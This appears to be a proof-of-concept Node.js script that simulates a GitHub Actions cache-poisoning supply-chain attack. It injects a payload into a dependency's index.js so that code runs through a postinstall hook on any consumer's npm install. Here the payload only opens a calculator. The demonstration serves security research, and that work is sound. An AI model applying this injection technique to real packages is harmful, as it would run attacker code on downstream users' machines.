// Local simulation of the full attack chain.
//
// Steps:
//   1. Ensure dependencies installed.
//   2. Apply the cache-poisoning payload to node_modules/is-number.
//   3. Rebuild dist/.
//   4. Run dist/postinstall.js (which would also run on `npm install`
//      by any consumer).
//
// Effect: Calculator opens, demo message prints. No GitHub or npm
// involvement required.
//
//   node attack/simulate-attack.js

const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

const repoRoot = path.resolve(__dirname, '..');
process.chdir(repoRoot);

function step(label, fn) {
  console.log('\n=== ' + label + ' ===');
  fn();
}

step('1. Ensure dependencies installed', () => {
  if (!fs.existsSync('node_modules/is-number')) {
    console.log('  installing...');
    execSync('npm install --silent', { stdio: 'inherit' });
  } else {
    console.log('  node_modules already present');
  }
});

step('2. Apply cache-poisoning payload to node_modules/is-number', () => {
  // Same logic as attack/fork-changes/scripts/dev-hook.js
  const target = path.join('node_modules', 'is-number', 'index.js');
  const original = fs.readFileSync(target, 'utf8');
  if (original.includes('supply-chain-demo')) {
    console.log('  already poisoned (skipping)');
    return;
  }
  const payload = `
// Injected by attacker's cache-poisoning PR.
(() => {
  try {
    const { exec } = require('child_process');
    const cmd = process.platform === 'darwin' ? 'open -a Calculator'
              : process.platform === 'win32' ? 'calc.exe'
              : 'gnome-calculator 2>/dev/null || xcalc 2>/dev/null || true';
    exec(cmd);
    console.log('[supply-chain-demo] supply-chain attack PoC triggered.');
    console.log('[supply-chain-demo] see https://github.com/lullu57/gh-actions-demo-cache-poisoning');
  } catch (e) {}
})();
`;
  fs.writeFileSync(target, payload + original);
  console.log('  poisoned', target);
});

step('3. Rebuild dist/ (simulates release workflow bundling)', () => {
  execSync('node scripts/build.js', { stdio: 'inherit' });
});

step('4. Run dist/postinstall.js (simulates consumer `npm install`)', () => {
  execSync('node dist/postinstall.js', { stdio: 'inherit' });
});

console.log('\nAttack chain completed locally.');
console.log('Reset:  rm -rf node_modules dist && npm install');
